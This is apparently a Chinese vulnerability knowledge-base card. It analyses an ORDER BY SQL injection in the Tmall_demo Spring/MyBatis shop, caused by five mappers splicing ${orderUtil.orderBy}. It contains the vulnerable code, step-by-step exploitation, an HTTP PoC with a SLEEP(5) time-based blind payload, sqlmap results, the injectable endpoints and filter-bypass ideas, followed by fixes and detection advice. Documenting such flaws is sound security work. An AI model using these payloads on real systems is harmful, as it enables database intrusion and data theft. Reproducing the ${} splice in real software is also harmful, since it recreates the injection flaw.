---
id: web-generic-sqli-tmall-orderutil-orderby-mybatis
title: Tmall_demo 五处 MyBatis ORDER BY ${orderUtil.orderBy} 排序注入：OrderUtil 透传 orderBy，sqlmap 时间盲注打通
type: scenario
domain: web
path: web/generic/sqli
technique: mybatis-order-util-orderby-sqli
aliases:
- Tmall_demo SQL注入
- orderUtil.orderBy 注入
- ORDER BY 注入
- 天猫商城 sqlmap
- ProductOrderMapper 注入
- 排序字段注入
tags:
- sqli
- java
- mybatis
- order-by
- spring
- sqlmap
- dollar-brace
- tmall
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V240
  verified_at: '2026-11-07T10:34:18+08:00'
  notes: 对照原文 img/14-26：全局搜索 ${ 命中 ProductMapper.xml:88/134、ProductOrderMapper.xml:104、RewardMapper.xml:74、UserMapper.xml:70 五处 ORDER BY ${orderUtil.orderBy}；img/18 确认五个 Controller 以 orderBy/isDesc 构造 OrderUtil，仅空串转 null；img/22 sqlmap 判定 MySQL>=5.0.12 time-based blind，payload orderBy=1 AND (SELECT 1255 FROM (SELECT(SLEEP(5)))DGRX)，78 请求/64 次 500。与 mybatis-dollar-brace、java-identifier-table-order-by 通用卡差异成立。原文无版本信息。
---

## 一句话结论

Tmall_demo 的 ProductMapper、ProductOrderMapper、RewardMapper、UserMapper 在 `ORDER BY ${orderUtil.orderBy}` 中直接文本替换排序字段，而 `OrderUtil.orderBy` 来自多个 Controller 的 `@RequestParam(required=false) String orderBy`，未做列名白名单；攻击者在 `admin/order/{index}/{count}` 等五个列表接口的 `orderBy` 参数中注入表达式，原文用 sqlmap 打通 MySQL 时间盲注。

## 原理

- MyBatis 的 `#{}` 生成 JDBC `?` 预编译参数，`${}` 在 SQL 解析前做字符串替换。排序字段属于 SQL 结构（标识符位置），不能用 `?` 绑定，所以项目用 `${orderUtil.orderBy}` 拼接；一旦 `orderBy` 可控，输入中的函数、子查询、`AND`/`OR` 都会进入 SQL 语法层。
- Mapper 中的典型片段（ProductMapper.xml 第 134 行附近）：

  ```xml
  <if test="orderUtil != null">
      ORDER BY ${orderUtil.orderBy}<if test="orderUtil.isDesc">desc </if>
  </if>
  <if test="pageUtil != null">
      LIMIT #{pageUtil.pageStart},#{pageUtil.count}
  </if>
  ```

  全局搜索 `${` 可见至少五处同型排序拼接：ProductMapper.xml:88、ProductMapper.xml:134、ProductOrderMapper.xml:104、RewardMapper.xml:74、UserMapper.xml:70。
- `OrderUtil` 是简单承载类：

  ```java
  public final class OrderUtil {
      private String orderBy;
      private boolean isDesc;
      public OrderUtil(String orderBy) { this.orderBy = orderBy; this.isDesc = false; }
      public OrderUtil(String orderBy, boolean isDesc) { this.orderBy = orderBy; this.isDesc = isDesc; }
      public String getOrderBy() { return orderBy; }
      public boolean getIsDesc() { return isDesc; }
  }
  ```

- 多个 Controller 把请求参数原样传入 `new OrderUtil(orderBy, isDesc)`，只做了空串转 `null`：
  - `OrderController#getOrderBySearch`：`admin/order/{index}/{count}`，参数 `orderBy`、`isDesc`；
  - `ProductController#getProductBySearch`：`admin/product/{index}/{count}`，参数 `orderBy`、`isDesc`；
  - `UserController#getUserBySearch`：`admin/user/{index}/{count}`，参数 `orderBy`、`isDesc`；
  - `RewardController#getRewardBySearch`：`admin/reward/{index}/{count}`，参数 `orderBy`、`isDesc`；
  - `ForeProductListController#searchProduct`：前台 `product/{index}/{count}`，参数 `orderBy`、`isDesc`。
- 没有任何枚举/白名单把 `orderBy` 映射到固定列名；`isDesc` 只是布尔值，拼接在 `${orderBy}` 之后，不影响在 `ORDER BY` 表达式里注入。
- 原文在后台订单列表抓包确认 `orderBy` 参数存在，再用 sqlmap 对 `admin/order/{index}/{count}` 做时间盲注；sqlmap 识别后端为 MySQL（>= 5.0.12），报出 78 个 HTTP 请求、多次 500，最终以 `SLEEP(5)` 载荷确认注入。

## 触发条件

- 目标为 Tmall_demo（Spring Boot + MyBatis，pom 中 `mybatis-spring-boot-starter` 2.2.2），数据库 MySQL。
- 对应 Mapper 使用 `ORDER BY ${orderUtil.orderBy}`，且 Controller 把外部 `orderBy` 直接传入 `OrderUtil`。
- 四个 `admin/*` 接口需要后台会话（原文以 admin 登录后测试）；前台 `product/{index}/{count}` 属于商品搜索，通常无需后台登录。
- `orderBy` 非空、未被 WAF/全局过滤器拦截；数据库错误回显或响应延迟可观测。

## 利用步骤

1. 登录后台，进入“全部订单”，抓取 `GET /tmall/admin/order/0/10?...&orderBy=&isDesc=true`。
2. 先把 `orderBy` 改成合法列名（如 `productOrder_id`）确认排序生效，再改 `orderBy` 为 `1` 观察是否按第一列排序。
3. 用时间盲注确认：`orderBy=1 AND (SELECT 1255 FROM (SELECT(SLEEP(5)))DGRX)`，比较响应耗时。
4. 交给 sqlmap 扩大（原文直接对上述 URL 跑 sqlmap，识别为 MySQL time-based blind）；再按库名/表名/列名提取数据。
5. 把同一 `orderBy` 载荷套到 `admin/product/{index}/{count}`、`admin/user/{index}/{count}`、`admin/reward/{index}/{count}`、前台 `product/{index}/{count}`，确认五处同型。
6. 若 `AND` 被过滤，可尝试 `ORDER BY` 后直接跟 `IF(condition,SLEEP(5),0)`、`CASE WHEN`、括号子查询等 MySQL 表达式。

## PoC

```http
GET /tmall/admin/order/0/10?productOrder_code=&productOrder_post=&productOrder_status_array=0&productOrder_status_array=1&productOrder_status_array=2&productOrder_status_array=3&productOrder_status_array=4&orderBy=1%20AND%20(SELECT%201255%20FROM%20(SELECT(SLEEP(5)))DGRX)&isDesc=true HTTP/1.1
Host: 127.0.0.1:8080
Cookie: JSESSIONID=<后台 admin 会话>; username=admin
X-Requested-With: XMLHttpRequest
```

```text
# 原文 sqlmap 结果：
# 参数 #1* (URI) 可注入，类型 time-based blind
# DBMS: MySQL >= 5.0.12
# Payload: orderBy=1 AND (SELECT 1255 FROM (SELECT(SLEEP(5)))DGRX)
```

五处同型接口：

```text
GET /tmall/admin/order/{index}/{count}?orderBy=<payload>&isDesc=true
GET /tmall/admin/product/{index}/{count}?orderBy=<payload>&isDesc=true
GET /tmall/admin/user/{index}/{count}?orderBy=<payload>&isDesc=true
GET /tmall/admin/reward/{index}/{count}?orderBy=<payload>&isDesc=true
GET /tmall/product/{index}/{count}?orderBy=<payload>&isDesc=true
```

## 变体与关联

- 注入位置变体：`orderBy` 在 `ORDER BY` 后、`isDesc` 的 `desc` 前，可直接接 `IF()`/`CASE`/子查询；也可用 `orderBy=1,2,3` 判断列数后配合 `UNION`。
- 接口变体：四个后台列表接口都需要 admin 会话；前台 `product/{index}/{count}` 若无鉴权则攻击面更大。ProductMapper 有两处 `${}`（88、134），分别对应不同列表查询。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]（`${}` 五类拼接点的通用原理与安全写法）；[[web-generic-sqli-java-identifier-table-order-by-injection]]（标识符位置不能预编译的通用原理）；[[web-generic-sqli-hanvon-eface-order-columnkey-mybatis]]（同为 MyBatis ORDER BY `${}` 的多接口实例）；[[web-generic-sqli-newbeemall-mybatis-dollar-goodsname-keyword]]（同项目类型的 MyBatis `${}` 注入）。
- 边界：若后端把 `orderBy` 映射到固定列名、或在 Mapper 用 `<choose>` 限制排序字段，注入不成立；原文未给出 `orderBy` 的服务端白名单代码（只确认了空串转 null），因此按“无白名单”记录。

## 检测与防御

- 修复：不要用 `${}` 拼接排序字段；在 Service 层用固定枚举/Map 把前端排序键映射到固定列名，`isDesc` 只映射到 `ASC`/`DESC`，其余输入拒绝。
- 修复：MyBatis 可用 `<choose>` 枚举固定列，或把排序字段改为后端常量；`ORDER BY` 位置绝不接受原始字符串。
- 加固：数据库账号最小权限；关闭详细 SQL 错误回显；WAF 拦截 `orderBy` 中的 `sleep`、`if(`、`case when`、`select`、逗号、括号等特征。
- 检测：审计 Mapper XML 中所有 `ORDER BY ${`；监控排序参数出现函数/子查询/布尔表达式；同一接口响应时间异常或大量 500；sqlmap 特征流量。
